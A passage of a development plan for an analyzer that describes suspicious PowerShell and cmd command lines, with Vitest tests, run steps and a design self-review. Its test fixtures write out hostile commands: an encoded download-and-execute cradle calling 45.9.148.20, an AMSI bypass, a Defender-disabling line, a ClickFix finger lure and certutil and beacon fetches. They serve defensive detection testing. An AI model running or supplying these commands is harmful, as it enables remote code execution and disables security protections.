  'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='

describe('execution ordering (D2/D6, 11-tier): delivery → interpreter-transition → decode → evade → fetch → execute', () => {
  it('a -enc, hidden+no-profile download→IEX cradle orders decode, then evade, then fetch, then execute, with sequential order numbers', async () => {
    // -nop + -w + -enc = 3 evasion flags (cluster fires) AND -w+-nop+FETCH+IEX
    // (clickfix's own hiddenFetchIex branch fires too) — but clickfix-delivery
    // does NOT fire here (no decoy/headless text), so the ordering stays clean:
    // decode(4) < evade(6) < fetch(7) < execute(8).
    const r = await analyze('powershell -nop -w hidden -enc ' + ENC_CRADLE)
    const texts = r.bullets.map((b) => b.text)
    const decodeIdx = texts.findIndex((t) => t.includes('Base64 `-EncodedCommand`'))
    const evadeIdx = texts.findIndex((t) => t.startsWith('Runs hidden'))
    const fetchIdx = texts.findIndex((t) => t.includes('Downloads content from'))
    const execIdx = texts.findIndex((t) => t.includes('Executes the downloaded content in memory'))
    expect(decodeIdx).toBeGreaterThanOrEqual(0)
    expect(evadeIdx).toBeGreaterThan(decodeIdx)
    expect(fetchIdx).toBeGreaterThan(evadeIdx)
    expect(execIdx).toBeGreaterThan(fetchIdx)
    expect(r.bullets.map((b) => b.order)).toEqual([1, 2, 3, 4])
    expect(texts.some((t) => t.includes('human-verification'))).toBe(false) // no delivery bullet: no decoy text present
  })

  it('a genuine ClickFix decoy fixture orders delivery FIRST, ahead of everything else', async () => {
    const r = await analyze("cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue")
    expect(r.bullets[0].text).toBe('Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)')
  })
})

describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', () => {
  const BANNED = /\b(malicious|attacker|likely|c2|backdoor|exploit|compromise|adversary|threat actor|hack)\b/i

  it('"payload" and "beacon" are allowed terms of art (used in spec §7\'s own example bullets), not banned', () => {
    expect('Executes an mshta payload (`https://`)').not.toMatch(BANNED)
    expect('Beacons to **45[.]9[.]148[.]20** in a loop').not.toMatch(BANNED)
  })

  it('no bullet emits a banned word across a representative fixture sweep', async () => {
    const fixtures = [
      'powershell -nop -w hidden -enc ' + ENC_CRADLE,
      "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')",
      "cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue",
      "while ($true) { Start-Sleep 5; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }",
      'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
      'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
      "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
      'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
    ]
    for (const input of fixtures) {
      const r = await analyze(input)
      for (const b of r.bullets) expect(b.text).not.toMatch(BANNED)
    }
  })
})

describe('coverage discipline (D5/D6): every signal maps to a bullet', () => {
  const ALL_SIGNAL_IDS = [
    'download-cradle', 'cmd-cradle', 'evasion-cluster', 'amsi-reflection', 'amsi-memory-patch',
    'etw-tamper', 'defender-tamper', 'clickfix', 'beaconing', 'reverse-shell', 'fileless-loader',
    'persistence', 'lolbin', 'mshta-interpreter', 'wsh-script-exec', 'wsh-decode-limits', 'wsh-concat-eval-present',
  ]

  it('lists exactly the 17 signal ids defined in techniques.ts (fails loudly if the signal catalog changes without a matching bullets.ts update)', () => {
    expect(TECHNIQUE_RULES.map((r) => r.id).sort()).toEqual([...ALL_SIGNAL_IDS].sort())
  })

  it.each(ALL_SIGNAL_IDS)('signal "%s" yields at least one bullet when it fires', (id) => {
    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
    if (id === 'clickfix') {
      const ctx = buildContext('captcha verify you are human', [], 'powershell')
      expect(deriveBullets(ctx, [], [], [sig('clickfix')]).length).toBeGreaterThan(0)
      return
    }
    if (id === 'lolbin') {
      const ctx = buildContext('', [], 'powershell')
      expect(deriveBullets(ctx, [], [], [sig('lolbin', { trigger: 'certutil' })]).length).toBeGreaterThan(0)
      return
    }
    if (id === 'defender-tamper') {
      const ctx = buildContext('Set-MpPreference -DisableRealtimeMonitoring $true', [], 'powershell')
      expect(deriveBullets(ctx, [], [], [sig('defender-tamper')]).length).toBeGreaterThan(0)
      return
    }
    const ctx = buildContext('Register-ScheduledTask', [], 'powershell') // corpus content only matters for persistence's mechanism-naming branch
    expect(deriveBullets(ctx, [], iocs, [sig(id)]).length).toBeGreaterThan(0)
  })
})

describe('opaque quarantine (D3/D6)', () => {
  it('WSH/HTA honesty bullets render at opaque tier, never resolved/inferred', async () => {
    const r = await analyze('wscript //E:vbscript C:\\Users\\Public\\payload.vbs')
    const honesty = r.bullets.filter((b) => b.text.includes('numeric char-code decode only') || b.text.includes('string-concat / eval'))
    expect(honesty.length).toBeGreaterThan(0)
    expect(honesty.every((b) => b.confidence === 'opaque')).toBe(true)
  })
})

describe('end-to-end fixture: finger/for-f cradle (D6)', () => {
  it('yields a single resolved fetch bullet naming the for-f/finger cradle', async () => {
    const r = await analyze("cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
    expect(r.bullets).toHaveLength(1)
    expect(r.bullets[0].text).toBe('Fetches a command via `for /f`/finger and executes its output')
    expect(r.bullets[0].confidence).toBe('resolved')
  })
})
```

- [ ] **Step 2: Run tests to verify they fail (or already pass, confirming Tasks 1-4 landed correctly)**

Run: `npx vitest run shared/analyzer/__tests__/bullets.test.ts`
Expected: if run BEFORE Tasks 1-4 are complete, these FAIL (no bullets exist at all pre-Task-3). Run AFTER Tasks 1-4, this is confirmation — if anything fails here, return to the relevant earlier task rather than patching ad hoc in this one.

- [ ] **Step 3: Confirm — no implementation step**

This task adds no production code; it is the closing discipline gate D6 names. If a fixture fails, the fix belongs in `bullets.ts` (Task 2) or `report.ts` (Task 3), not here.

- [ ] **Step 4: Run the full suite**

Run: `npx vitest run shared/analyzer` and `tsc -b`
Expected: PASS — all pre-existing 138 specs plus every new spec from Tasks 1-5, clean type-check.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/__tests__/bullets.test.ts
git commit -m "test(analyzer): ordering, banned-word, and opaque-quarantine coverage for bullets"
```

---

## Self-Review

**1. Decided-design (D1-D8) coverage:**

| Decision | Task |
|---|---|
| D1 — fact sources / `deriveBullets` signature | Task 2 (`deriveBullets(ctx, layers, iocs, signals)`), wired in Task 3 |
| D2 — verb-family ordering, revised 11-tier (delta from spec's literal statementIndex/dataflowDepth, further revised by SOC review: `delivery`/`interpreter-transition` split out as their own tiers 1-2) | Task 2 (`FAMILY_PRIORITY` + `layerIndex` tie-break), tested in Task 5 (both the plain-cradle and the ClickFix-decoy ordering fixtures) |
| D3 — three-tier confidence | Task 2 (per-rule `confidence` assignment), tested in Tasks 2 and 5 (opaque quarantine) |
| D4 — the `inferred` fact (resolve.ts poisoned surface) | Task 1 (`resolveWithFacts`/`DecodedLayer.hadUnresolvedOperand`), consumed by Task 2's fetch/beacon/LOLBin rules, wired live in Task 3 |
| D5 — the `ActionRule` set, SOC-review revision | Task 2 (28 rules: the original 19 + `clickfix-delivery` (must-fix #1) + 6 per-LOLBin rules (must-fix #1) + the amsi/defender rule splits (must-fix #3, +2 net) — coverage discipline and the branch-not-slash render rule tested in Task 5) |
| D6 — discipline (verb-first/one-action/never-invents-intent/ordering/opaque-quarantine/banned-word, widened word list + payload/beacon allowlist) | Baked into every rule's `render()` in Task 2; tested explicitly in Task 5 |
| D7 — UI + copyText | Task 3 (`composeCopyText`'s "What it did" section) + Task 4 (`ActionBullets.tsx`, inserted between `TechniqueTally`/`DecodeLadder`) |
| D8 — deferred (caret-cmdlex bullet, entropy-qualified opaque) | NOT built — named explicitly here and in `bullets.ts`'s `FAMILY_PRIORITY` comment (the unused `deobfuscate` priority slot reserves D8's future landing spot) |

No decision was left unmapped.

**2. Placeholder scan:** No "TBD"/"TODO"/"add validation"/"handle edge cases"/"similar to Task N" phrasing appears anywhere in this plan. Every code step is the actual file content or an actual diff; every test step has real assertions against real strings the implementation produces (verified against the current `report.ts`/`techniques.ts`/`wsh.ts`/`lolbins.ts`/`fold.ts` source, not invented). Two open calls from the decided design are resolved concretely, not left as placeholders:
- D1's literal `deriveBullets(buildContext(corpus, flags, interpreter), layers, iocs, signals)` signature doesn't show where D4's fact travels — resolved as a `DecodedLayer.hadUnresolvedOperand` field (D4's own explicitly-named fallback: "or a boolean 'had-unresolved-operands' per resolved layer"), not a `buildContext`/`RuleContext` widening, keeping `deriveBullets`'s signature exactly as D1 states it.
- The revised D5's `clickfix` bullet, read literally off just the `clickfix` signal, would misfire on techniques.ts's own generic `hiddenFetchIex` branch (a bare hidden+no-profile+fetch+IEX cradle with no literal verification-prompt text) — asserting "presents a fake human-verification prompt" there would itself be an invented fact, contradicting D6. `clickfix-delivery`'s `fires()` re-checks the actual decoy-phrase/headless-conhost text (the same discriminators techniques.ts's own rule uses internally) before firing — narrower than "signal present," consistent with D6's own "never invents intent" test. Flagged here per this task's "note it, don't silently diverge" instruction.

**Two scoping decisions, named rather than silently applied:**
- Revised D5's `evasion-cluster` text — "(only the flags that resolved)" — is honored: `evasion-hidden-run` now builds its text from `ctx.flags` (only the descriptors that actually resolved), not a static "hidden, no-profile, with execution-policy bypass" string. This wasn't in the coordinator's 7 numbered must-fixes but IS in D5's current text, so it's folded in as part of re-reading D5.
- Revised D5's `persistence` bullet (branching to "Creates scheduled task **{name}** running **{action}**" / "Sets an autostart Run-key **{name}** → **{value}**" / "Registers a WMI event-subscription for persistence" with resolved name/action/value interpolation) and `decompress-inflate`'s exact `{gzip|raw-DEFLATE}` algorithm naming are **NOT implemented** in this revision — neither was in the coordinator's 7 numbered must-fixes, and both need a new fact-extraction addition beyond this delta's scope (persistence's per-field name/action/value capture; `fold.ts`'s `inflate()` doesn't currently surface which of gzip/raw-DEFLATE it used to `report.ts`'s layer, verified at `fold.ts:39-44`). `creates-persistence` keeps its existing 4-mechanism branch (unhedged: renders exactly one resolved mechanism, never a slash); `decompress-inflate` keeps its generic "gzip/DEFLATE" wording with a comment naming the gap. Both are candidates for a future D4-shaped small pipeline addition, not silently dropped.

**3. Type consistency:**
- `ActionBullet`/`ConfidenceTier` (Task 2's imports) are the pre-existing `types.ts` shapes (verified at `types.ts:5` and `types.ts:55-62`) — no redefinition anywhere in this plan.
- `DecodedLayer` (widened in Task 1 with `hadUnresolvedOperand?: boolean`) is the same type Task 2's rules read (`ctx.layers: DecodedLayer[]`) and Task 3 writes (the resolve-loop's pushed layer object) — one shape, one place of definition.
- `BulletContext`/`Match`/`ActionRule`/`VerbFamily`/`FAMILY_PRIORITY`/`RULES`/`deriveBullets` (all defined in Task 2) are consumed unchanged by Task 3 (`deriveBullets` call site) and referenced only by name (no shape) in Task 4's UI and Task 5's tests. `techniques.ts` also exports a `RULES` const (the `SignatureRule[]` table) — Task 5 imports it aliased as `TECHNIQUE_RULES` specifically to avoid colliding with `bullets.ts`'s own `RULES` import in the same test file.
- `composeCopyText`'s new `bullets: AnalysisResult['bullets']` parameter (Task 3) matches the existing `iocs: AnalysisResult['iocs']` parameter's style precedent in the same function signature — no new type alias introduced for it.
- `resolveVars`/`resolve` (unchanged signatures) vs. `resolveVarsWithFacts`/`resolveWithFacts` (new, Task 1) — no naming collision, and `resolveVars`/`resolve`'s call sites elsewhere in the codebase (`resolve.test.ts`) are untouched.

No inconsistencies found.

**Residual note (transparency, not a deviation):** Task 1's `resolveVarsWithFacts` treats "a variable used before its one assignment, or never bound at all" as poisoned too, in addition to the reassignment/non-literal case `resolve.ts:63` already tracked. This is a small, same-function extension of D4's named fact (not a new subsystem, no new tokenization) that materially improves the `inferred` tier's real-world hit rate — flagged here for visibility since D4 anchored specifically on the reassignment-only `poisoned` set at that line.
